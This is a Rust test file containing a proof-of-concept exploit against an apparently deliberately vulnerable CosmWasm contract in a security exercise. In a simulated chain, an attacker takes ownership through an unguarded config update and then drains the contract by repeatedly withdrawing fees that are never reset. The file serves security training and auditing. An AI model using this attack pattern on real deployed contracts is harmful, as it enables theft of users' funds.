use cosmwasm_std::{Addr, Coin, Decimal, Uint128};
use cw_multi_test::{App, ContractWrapper, Executor};

use crate::{
    msg::{ExecuteMsg, QueryMsg},
    state::Config,
};

use super::DENOM;

fn setup(app: &mut App) -> Addr {
    let contract_box = ContractWrapper::new(
        crate::contract::execute,
        crate::contract::instantiate,
        crate::contract::query,
    );
    let code_id = app.store_code(Box::new(contract_box));
    let init_msg = crate::msg::InstantiateMsg {};
    let owner = "owner";
    let owner_addr = Addr::unchecked(owner);

    let funds = Coin {
        denom: DENOM.to_string(),
        amount: Uint128::new(1000),
    };

    app.sudo(cw_multi_test::SudoMsg::Bank(
        cw_multi_test::BankSudo::Mint {
            to_address: owner.to_string(),
            amount: vec![funds.clone()],
        },
    ))
    .unwrap();

    app.instantiate_contract(code_id, owner_addr, &init_msg, &[funds], "dojo", None)
        .unwrap()
}

#[test]
fn exploit() {
    // setup contract
    let mut app = App::default();
    let contract_addr = setup(&mut app);

    let attacker = "attacker";
    let attacker_addr = Addr::unchecked(attacker);

    let funds = Uint128::new(100);

    let attacker_funds = Coin {
        denom: DENOM.to_string(),
        amount: funds,
    };

    // mint some funds to attacker
    app.sudo(cw_multi_test::SudoMsg::Bank(
        cw_multi_test::BankSudo::Mint {
            to_address: attacker.to_string(),
            amount: vec![attacker_funds.clone()],
        },
    ))
    .unwrap();

    // attacker deposit funds and withdraws all
    let msg = ExecuteMsg::Deposit {};
    app.execute_contract(
        attacker_addr.clone(),
        contract_addr.clone(),
        &msg,
        &[attacker_funds],
    )
    .unwrap();

    // attacker withdraw all funds
    let msg = ExecuteMsg::Withdraw { amount: funds };
    app.execute_contract(attacker_addr.clone(), contract_addr.clone(), &msg, &[])
        .unwrap();

    // contract bal left with initial balance and platform fee
    let contract_bal = app
        .wrap()
        .query_balance(contract_addr.clone(), DENOM)
        .unwrap();
    assert_eq!(
        contract_bal.amount,
        Uint128::new(1000) + funds * Decimal::percent(5)
    );

    // attacker calls update config
    let msg = ExecuteMsg::UpdateConfig {
        new_owner: attacker.to_string(),
    };
    app.execute_contract(attacker_addr.clone(), contract_addr.clone(), &msg, &[])
        .unwrap();

    // owner is now attacker
    let config_res: Config = app
        .wrap()
        .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
        .unwrap();
    assert_eq!(config_res.owner, attacker);

    let fees = config_res.total_fee;

    // combining with another vulnerability (fees are not reset), attacker can steal all funds from contract
    loop {
        let contract_bal = app
            .wrap()
            .query_balance(contract_addr.clone(), DENOM)
            .unwrap();

        if contract_bal.amount > fees {
            // repeatedly withdraw fees from contract
            let msg = ExecuteMsg::WithdrawFees {};
            app.execute_contract(attacker_addr.clone(), contract_addr.clone(), &msg, &[])
                .unwrap();
        } else {
            break;
        }
    }

    let attacker_bal = app.wrap().query_balance(attacker_addr, DENOM).unwrap();
    assert_eq!(attacker_bal.amount, Uint128::new(1095));
}
